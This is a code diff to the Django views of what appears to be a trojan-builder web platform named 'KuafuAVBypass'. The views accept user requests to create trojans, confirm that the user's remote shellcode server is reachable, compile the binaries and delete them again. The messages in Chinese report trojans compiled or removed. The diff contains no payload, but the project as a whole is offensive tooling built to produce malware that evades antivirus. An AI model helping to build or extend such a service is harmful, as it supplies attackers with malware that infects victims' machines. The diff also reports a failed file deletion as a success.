@@ -1,8 +1,7 @@
 
 
 #Create your views here.
-from django.shortcuts import render,redirect
-from django.http import HttpResponse
+from django.shortcuts import render
 from .forms import TrojanListForm
 from .models import TrojanList
 from .utils .TrojanCompileInterface import compileService
@@ -14,29 +13,33 @@ import os
 from django.http import HttpResponseNotAllowed
 from django.http import JsonResponse
 from django.shortcuts import get_object_or_404
-from KuafuAVBypass import settings
-from os.path import normpath
-import re
 import json
-
+import requests
+import logging
+logger = logging.getLogger('django')
 
 def create_trojan(request):
     if request.method == 'POST':
         form = TrojanListForm(request.POST,request.FILES)
         if form.is_valid():
-            # 如果需要，这里可以执行额外的处理，比如计算文件哈希
             trojan = form.save(commit=False)
             trojan.user = request.user
             if trojan.shellcode_remote:
                 if not trojan.user.shellcode_ip_addr:
-                    return JsonResponse({"success": False, 'message': '远程shellcode服务器地址为空！'})
+                    return JsonResponse({"success": False, 'message': '远程shellcode服务器地址为空,请前去用户信息页面添加'})
+                else:
+                    try:
+                        requests.get(trojan.user.shellcode_ip_addr, timeout=5)
+                    except requests.RequestException:
+                        return JsonResponse({"success": False, "message": "远程shellcode服务器已失效，请前去用户信息页面更新"})
             trojan.save()
             trojan = compileService(trojan)
-            if not trojan:
-                return JsonResponse({"success": False, 'message': '木马编译错误！'})
+            if not trojan.file_hash:
+                TrojanList.objects.filter(id=trojan.id).delete()
+                return JsonResponse({"success": False, 'message': '木马编译错误'})
             trojan.save()
             # 重定向到其他页面，比如展示所有记录的列表页面
-            return JsonResponse({"success": True, 'message': '木马生成成功！'})
+            return JsonResponse({"success": True, 'message': '木马编译成功'})
         else:
             errors_json = form.errors.as_json()
             errors_dict = json.loads(errors_json)
@@ -113,10 +116,14 @@ def delete_trojan(request, trojan_id):
 
     try:
         trojan_to_delete = get_object_or_404(TrojanList, id=trojan_id)
+        trojan_to_delete.delete()
         trojan_path = os.path.join('media', 'binaryfile', trojan_to_delete.file_hash)
         os.remove(trojan_path)
-        trojan_to_delete.delete()
         return JsonResponse({"success": True, "message": "木马删除成功"})
     except TrojanList.DoesNotExist:
         # 不太可能到达这里，因为 get_object_or_404 会在对象不存在时抛出 Http404
         return JsonResponse({"success": False, "message": "木马不存在"}, status=404)
+    except Exception as e:
+        # 如果删除文件失败，可以在这里处理异常
+        logging.error(f"木马文件删除异常: {e}")
+        return JsonResponse({"success": True, "message": "木马删除成功"})
